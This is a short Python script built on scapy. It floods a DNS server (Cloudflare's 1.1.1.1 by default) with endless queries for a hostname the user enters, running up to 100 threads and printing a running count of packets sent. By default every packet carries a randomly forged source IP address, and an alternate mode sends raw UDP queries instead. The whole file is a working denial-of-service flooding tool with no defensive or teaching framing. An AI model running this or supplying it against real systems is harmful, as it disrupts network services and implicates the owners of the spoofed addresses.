from scapy.all import *
import threading
import time
import sys

sent = 0

active_threads = 0
max_threads = 100

def random_ip():
    ip = []
    for _ in range(4):
        ip.append(str(random.randrange(256)))
    ip = ".".join(ip)
    return ip

def dns(host, dns_server="1.1.1.1"):
    try:
        global active_threads
        global sent
        active_threads += 1
        if not "magik" in sys.argv:
            packet = IP(dst=dns_server) / UDP() / DNS(qd=DNSQR(qname=host))
            while True:
                packet[IP].src = random_ip()
                sr1(packet, verbose=0, timeout=0)
                sent += 1
        else:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = DNS(qd=DNSQR(qname=host))
            while True:
                packet = bytes(packet)
                sock.sendto(packet, (dns_server, 53))
                sent += 1
    except Exception as e:
        print(f"dns error: {e}")
        pass
    finally:
        active_threads -= 1

def verbose():
    while True:
        time.sleep(1)
        print(f"Sent -> {sent}")

host = input("Host: ")

threading.Thread(target=verbose, daemon=True).start()
while True:
    if active_threads >= max_threads:
        continue
    threading.Thread(target=dns, args=[host], daemon=True).start()
